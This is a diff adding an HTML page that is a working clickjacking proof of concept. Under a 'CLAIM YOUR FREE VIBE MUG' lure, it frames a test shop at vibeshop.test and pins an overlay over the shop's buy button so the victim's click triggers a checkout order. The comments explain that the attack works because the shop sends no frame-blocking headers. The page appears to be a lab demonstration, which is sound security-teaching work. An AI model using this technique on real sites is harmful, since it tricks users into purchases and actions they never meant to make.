@@ -1,0 +1,55 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CLAIM YOUR FREE VIBE MUG</title>
+<style>
+  body { margin: 0; font-family: system-ui, sans-serif; background: #101014; color: #eee; }
+  .wrap { padding: 14px; }
+  h1 { font-size: 20px; margin: 0 0 2px; }
+  .lead { margin: 0 0 10px; color: #9aa; font-size: 13px; }
+  .legend { max-width: 900px; font-size: 12px; color: #8a8; margin-top: 10px; line-height: 1.5; }
+  code { color: #ffd479; }
+
+  /* fixed-size frame, so the shop's layout inside it is deterministic */
+  .stage { position: relative; width: 900px; border: 1px solid #333; }
+  iframe { display: block; width: 900px; height: 520px; border: 0; overflow: hidden; }
+
+  /* the pay-off: a transparent overlay pinned exactly on top of the shop's "buy" button.
+     pointer-events:none lets the click fall through to the shop underneath.
+     flip it to auto and the attacker's element is what receives the click instead. */
+  .hit {
+    position: absolute; left: 16px; top: 167px; width: 46px; height: 31px;
+    box-sizing: border-box; border: 2px dashed #ff3b30;
+    background: rgba(255, 59, 48, .18);
+    pointer-events: none;
+  }
+  .hitlabel {
+    position: absolute; left: 74px; top: 168px; font-size: 12px; color: #ff3b30;
+    white-space: nowrap; pointer-events: none;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>CLAIM YOUR FREE VIBE MUG</h1>
+  <p class="lead">Click inside the red box. The shop is framed underneath and its own "buy" button is what your click hits.</p>
+
+  <div class="stage">
+    <!-- framed document. the shop sends no X-Frame-Options and no CSP frame-ancestors, so this is allowed -->
+    <iframe src="http://vibeshop.test:8080/product/8" scrolling="no" title="VibeShop"></iframe>
+
+    <!-- the overlay the victim is aimed at -->
+    <div class="hit"></div>
+    <div class="hitlabel">&lt;- the shop's "buy" button, wearing the attacker's dress</div>
+  </div>
+
+  <div class="legend">
+    the overlay is pinned to the shop's control at <code>left:16px top:167px 46x31</code>, measured off a
+    real 900px render. <code>pointer-events:none</code> passes the click through, so the shop fires
+    <code>POST /api/checkout?redirect=1</code> and a new order row is written. The frame then shows
+    <code>/order/N</code>, which is the on-screen proof.
+  </div>
+</div>
+</body>
+</html>
